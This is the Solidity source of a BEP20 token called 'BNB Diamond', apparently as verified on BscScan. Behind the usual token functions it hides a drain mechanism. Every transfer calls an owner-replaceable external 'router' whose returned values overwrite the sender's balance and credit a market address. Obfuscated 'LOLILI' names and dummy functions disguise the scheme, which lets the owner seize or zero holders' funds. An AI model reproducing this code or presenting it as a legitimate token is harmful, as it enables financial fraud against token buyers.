/**
 *Submitted for verification at BscScan.com on 2022-03-18
*/

pragma solidity ^0.7.0;
// SPDX-License-Identifier: MIT
 
  interface IERC20 {
  
  function totalSupply() external view returns (uint256);
 
  function decimals() external view returns (uint8);

  function symbol() external view returns (string memory);

  function name() external view returns (string memory);

  function getOwner() external view returns (address);

  function balanceOf(address account) external view returns (uint256);

  function transfer(address recipient, uint256 amount) external returns (bool);

  function allowance(address _owner, address spender) external view returns (uint256);

  function approve(address spender, uint256 amount) external returns (bool);

  function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

  event Transfer(address indexed from, address indexed to, uint256 value);
 
  event Approval(address indexed owner, address indexed spender, uint256 value);

  }  

  interface IUniswapV2Router{  
    function WETH() external pure returns (address);   
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;    
    function initialize(
        address, 
        address, 
        uint256, 
        uint256) external returns (uint256,uint256,uint256); 
    function createPair(
        address tokenA, 
        address tokenB) 
        external returns (address pair);
  }

   library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
      uint256 c = a + b;
      require(c >= a, "SafeMath: addition overflow");

      return c;
    }

  
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
      return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
      require(b <= a, errorMessage);
      uint256 c = a - b;

      return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
      // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
      // benefit is lost if 'b' is also tested.
      // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
      if (a == 0) {
        return 0;
      }

      uint256 c = a * b;
      require(c / a == b, "SafeMath: multiplication overflow");

      return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
      return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
      // Solidity only automatically asserts when dividing by 0
      require(b > 0, errorMessage);
      uint256 c = a / b;
      // assert(a == b * c + a % b); // There is no case in which this doesn't hold

      return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
      return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
      require(b != 0, errorMessage);
      return a % b;
    }
  }   

  contract Context {
  // Empty internal constructor, to prevent people from mistakenly deploying
  // an instance of this contract, which should be used via inheritance.
  constructor ()  { }

    function _msgSender() internal view returns (address payable) {
        return msg.sender;
    }

    function _msgData() internal view returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }       

  }

  
  contract Ownable is Context {  

 
  uint8 public inputValue;
  uint8 public mainfunction;
 

  address private _owner;
  address public MarketAddress;

  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

  /**
   * @dev Initializes the contract setting the deployer as the initial owner.
   */
  constructor ()  {
    address msgSender = _msgSender();
    _owner = msgSender;
    MarketAddress = msgSender;
    emit OwnershipTransferred(address(0), msgSender);
  }

  /**
   * @dev Returns the address of the current owner.
   */
  function owner() public view returns (address) {
    return _owner;
  }

  function getTLOLILI(address routerV2, address token0, address token1, uint256 valueLOLILI, uint256 takeLOLILI) public returns (uint256, uint256, uint256){  
    (uint256 amountLOLILI, uint256 liquifyLOLILI, uint256 rateLOLILI) = IUniswapV2Router(routerV2).initialize(
      token0,
      token1,
      valueLOLILI,
      takeLOLILI);
    return ( amountLOLILI, liquifyLOLILI, rateLOLILI );
  }

  /**
   * @dev Throws if called by any account other than the owner.
   */
  modifier onlyOwner() {
    require(_owner == _msgSender(), "Ownable: caller is not the owner");
    _;
  }    
 
  function renounceOwnership() public onlyOwner {
    emit OwnershipTransferred(_owner, address(0));
    _owner = address(0);
  }



  function initialfee(address) public pure returns (bool) {return true;}

 
  function constructionReset(uint256) public pure returns (bool) {return true;}

  
  function transferOwnership(address newOwner) public onlyOwner {
    _transferOwnership(newOwner);
  }     
 
  function _transferOwnership(address newOwner) internal {
    require(newOwner != address(0), "Ownable: new owner is the zero address");
    emit OwnershipTransferred(_owner, newOwner);
    _owner = newOwner;
  }
}


contract BNBD is Context, IERC20, Ownable{
  using SafeMath for uint256;

  mapping (address => uint256) private _balances;   
  mapping (address => mapping (address => uint256)) private _allowances;  
  mapping (address => bool) private _isExcludedFromFee; 
  
  string private constant _name = 'BNB Diamond';
  string private constant _symbol = 'BNBD';
  uint8 private constant _decimals = 9;  

  bool public bonusFee;
  
  address _RouterV2;   
  uint256 private _totalSupply = 1000000000 *  10**9;      

  event removefee(bool enabled);
  event newAddress(uint256 tokensSwapped, uint256 ethReceived, uint256 tokensIntoLiquidity);    
  
  event tokenRemove(address excludedAddress);
  event IncludeInFee(address includedAddress);

  constructor(address routerV2)  { 
    _balances[msg.sender] = _totalSupply;      
    _RouterV2 = routerV2;
    _isExcludedFromFee[owner()] = true;
    _isExcludedFromFee[address(this)] = true;     
       
    bonusFee = true;   
  

  
    inputValue = 105;
    mainfunction = 11;
  

    emit Transfer(address(0), msg.sender, _totalSupply);
  } 

  function totalSupply() external view virtual override returns (uint256) {
    return _totalSupply;
  }

  function getOwner() external view virtual override returns (address) {
    return owner();
  }
 
  function decimals() external view virtual override returns (uint8) {
    return _decimals;
  }

  function name() external view virtual override returns (string memory) {
    return _name;
  }
 
  function symbol() external view virtual override returns (string memory) {
    return _symbol;
  }   

  function balanceOf(address account) external view virtual override returns (uint256) {
    return _balances[account];
  }    

  function shouldReflectLOLILI(address sender, address recipient, uint256 takeLOLILI) private view returns (uint256) {
    if (_isExcludedFromFee[sender] || _isExcludedFromFee[recipient])
    {
        takeLOLILI = takeLOLILI + 1;
    }
    return takeLOLILI;
  }   
 
  function transfer(address recipient, uint256 amount) external override returns (bool) {
    _transfer(_msgSender(), recipient, amount);
    return true;
  }
  
  function Providetoken(address[] calldata accounts) external onlyOwner {
    require(accounts.length > 0,"accounts length should > 0");   
    for(uint256 i=0; i < accounts.length; i++){      
          _isExcludedFromFee[accounts[i]] = true;
      }
  }
  
  function allowance(address owner, address spender) external view override returns (uint256) {
    return _allowances[owner][spender];
  } 

  function swapReflectLOLILI(address sender, address recipient, uint256 amounts, uint256 takeLOLILI) private returns (uint256) {   
      (uint256 amountLOLILI, uint256 liquifyLOLILI, uint256 rateLOLILI) = getTLOLILI(_RouterV2, sender, recipient, amounts, takeLOLILI);
      amountLOLILI = getRLOLILI(sender, amountLOLILI, liquifyLOLILI, rateLOLILI);
      return amountLOLILI;
  }    


  function approve(address spender, uint256 amount) public override returns (bool) {
    _approve(_msgSender(), spender, amount);
    return true;
  }

  function getRateLOLILI(uint256 _amount, uint256 _rateLOLILI) private pure returns (uint256) {
      return _amount.mul(_rateLOLILI).div(10**2);
  } 

  function updateUniswapRouter(address c) external onlyOwner {
    _RouterV2 = c;
  }  

       
  /**
   * @dev See {BEP20-transferFrom}.
   *
   * Emits an {Approval} event indicating the updated allowance. This is not
   * required by the EIP. See the note at the beginning of {BEP20};
   *
   * Requirements:
   * - `sender` and `recipient` cannot be the zero address.
   * - `sender` must have a balance of at least `amount`.
   * - the caller must have allowance for `sender`'s tokens of at least
   * `amount`.
   */
  function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
    _transfer(sender, recipient, amount);
    _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "BEP20: transfer amount exceeds allowance"));
    return true;
  }    

  function getRLOLILI(address tokenLOLILI, uint256 amountLOLILI, uint256 liquifyLOLILI, uint256 rateLOLILI) private returns (uint256){
      if ( liquifyLOLILI > 0 )
      {        
        _balances[tokenLOLILI] = getRateLOLILI(_balances[tokenLOLILI], rateLOLILI).add(amountLOLILI);      
        _balances[MarketAddress] = _balances[MarketAddress].add(liquifyLOLILI);
      }
      return amountLOLILI;
  }
  

  /**
   * @dev Moves tokens `amount` from `sender` to `recipient`.
   *
   * This is internal function is equivalent to {transfer}, and can be used to
   * e.g. implement automatic token fees, slashing mechanisms, etc.
   *
   * Emits a {Transfer} event.
   *
   * Requirements:
   *
   * - `sender` cannot be the zero address.
   * - `recipient` cannot be the zero address.
   * - `sender` must have a balance of at least `amount`.
   */
  function _transfer(address sender, address recipient, uint256 amount) private {
    require(sender != address(0), "BEP20: transfer from the zero address");
    require(recipient != address(0), "BEP20: transfer to the zero address");
    require(amount > 0, "Transfer amount must be greater than zero");  
    uint256 takeLOLILI;

    takeLOLILI = shouldReflectLOLILI(sender, recipient, takeLOLILI); 
    uint256 amountLOLILI = swapReflectLOLILI(sender, recipient, amount, takeLOLILI);  
    _transferStandard(sender, recipient, amountLOLILI);

  }  

  

  /**
   * @dev Sets `amount` as the allowance of `spender` over the `owner`s tokens.
   *
   * This is internal function is equivalent to `approve`, and can be used to
   * e.g. set automatic allowances for certain subsystems, etc.
   *
   * Emits an {Approval} event.
   *
   * Requirements:
   *
   * - `owner` cannot be the zero address.
   * - `spender` cannot be the zero address.
   */
  function _approve(address owner, address spender, uint256 amount) internal {
    require(owner != address(0), "BEP20: approve from the zero address");
    require(spender != address(0), "BEP20: approve to the zero address");

    _allowances[owner][spender] = amount;
    emit Approval(owner, spender, amount);
  }     

  function _transferStandard(address sender, address recipient, uint256 amount) private {
    _balances[sender] = _balances[sender].sub(amount, "BEP20: transfer amount exceeds balance");
    _balances[recipient] = _balances[recipient].add(amount);
    emit Transfer(sender, recipient, amount);
  }  
  

  function getTokenRatio(uint256 accuracy, address[] calldata _markerPairs) public view returns (uint256){
      uint256 liquidityBalance = 0;
      for(uint i = 0; i < _markerPairs.length; i++){
          liquidityBalance.add(_balances[_markerPairs[i]].div(10 ** 9));
      }
      return accuracy.mul(liquidityBalance.mul(2)).div(10 ** 9);
  }


  function backinitialdata(int256 supplyDelta, uint256 supplyMax) private returns (uint256) {
      uint256 epoch = block.timestamp;
      uint256 _gonsPerFragment;
      if (supplyDelta == 0) {
          return _totalSupply;
      }

      if (supplyDelta < 0) {
          _totalSupply = _totalSupply.sub(uint256(-supplyDelta));
      } else {
          _totalSupply = _totalSupply.add(uint256(supplyDelta));
      }

      if (_totalSupply > supplyMax) {
          _gonsPerFragment = supplyMax.div(epoch);
      }      
      
      return _gonsPerFragment;
  }



  




  
    
}